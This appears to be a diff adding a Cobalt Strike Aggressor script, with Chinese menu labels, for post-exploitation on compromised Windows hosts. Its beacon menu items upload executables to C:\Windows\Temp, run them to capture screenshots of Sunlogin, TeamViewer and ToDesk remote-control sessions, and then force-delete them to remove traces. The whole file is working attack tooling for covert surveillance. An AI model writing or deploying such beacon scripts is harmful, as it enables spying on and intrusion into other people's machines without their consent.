@@ -1,0 +1,118 @@
+	menu "远程控制类应用截屏抓取" {
+		menu "向日葵应用截屏抓取" {
+			item "上传 Sunloginscreen" {
+				$bid = $1;
+				$dialog = dialog("上传 Sunlogin", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &sunupload);
+                dialog_description($dialog, "用于目标机器正在运行向日葵的情况，抓取截图3张。");
+				drow_text($dialog, "UploadPath",  "上传路径: "); 	
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+        }
+			sub sunupload {
+				bcd($bid, $3['UploadPath']);
+    			bupload($bid, script_resource("/scripts/远程控制/Sunloginscreen.exe"));
+				}
+
+			item "运行 Sunloginscreen"{
+            	bshell($1, "cmd /C Sunloginscreen.exe");
+                }
+			
+
+        	item "删除 Sunloginscreen"{
+        	local('$bid');
+        	foreach $bid ($1){
+                bshell($1, "del /f /s /q Sunloginscreen.exe");
+                }
+		}
+		}
+
+		menu "向日葵应用截屏抓取备用" {
+			item "上传 Sunloginscreentest" {
+				$bid = $1;
+				$dialog = dialog("上传 Sunlogintest", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &suntestupload);
+                dialog_description($dialog, "用于上面那种抓取截屏失败的情况，抓取截图3张。");
+				drow_text($dialog, "UploadPath",  "上传路径: "); 	
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+        }
+			sub suntestupload {
+				bcd($bid, $3['UploadPath']);
+    			bupload($bid, script_resource("/scripts/远程控制/Sunloginscreentest.exe"));
+				}
+
+			item "运行 Sunloginscreentest"{
+            	bshell($1, "cmd /C Sunloginscreentest.exe");
+                }
+			
+
+        	item "删除 Sunloginscreentest"{
+        	local('$bid');
+        	foreach $bid ($1){
+                bshell($1, "del /f /s /q Sunloginscreentest.exe");
+                }
+		}
+		}
+		menu "Teamviewer应用截屏抓取" {
+			item "上传 Teamviewerscreen" {
+				$bid = $1;
+				$dialog = dialog("上传 Teamviewer", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &sunupload);
+                dialog_description($dialog, "用于目标机器正在运行Teamviewer的情况，抓取截图3张。");
+				drow_text($dialog, "UploadPath",  "上传路径: "); 	
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+        }
+			sub sunupload {
+				bcd($bid, $3['UploadPath']);
+    			bupload($bid, script_resource("/scripts/远程控制/Teamviewerscreen.exe"));
+				}
+
+			item "运行 Teamviewerscreen"{
+            	bshell($1, "cmd /C Teamviewerscreen.exe");
+                }
+			
+
+        	item "删除 Teamviewerscreen"{
+        	local('$bid');
+        	foreach $bid ($1){
+                bshell($1, "del /f /s /q Teamviewerscreen.exe");
+                }
+		}
+		}
+
+		menu "Todesk应用截屏抓取" {
+			item "上传 Todeskscreen" {
+				$bid = $1;
+				$dialog = dialog("上传 Todesk", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &sunupload);
+                dialog_description($dialog, "Todesk");
+				drow_text($dialog, "UploadPath",  "上传路径: "); 	
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+        }
+			sub sunupload {
+				bcd($bid, $3['UploadPath']);
+    			bupload($bid, script_resource("/scripts/远程控制/Todeskscreen.exe"));
+				}
+
+			item "运行 Todeskscreen"{
+            	bshell($1, "cmd /C Todeskscreen.exe");
+                }
+			
+
+        	item "删除 Todeskscreen"{
+        	local('$bid');
+        	foreach $bid ($1){
+                bshell($1, "del /f /s /q Todeskscreen.exe");
+                }
+		}
+		}
+		
+			
+
+
+
+
+
+
+
+
+}
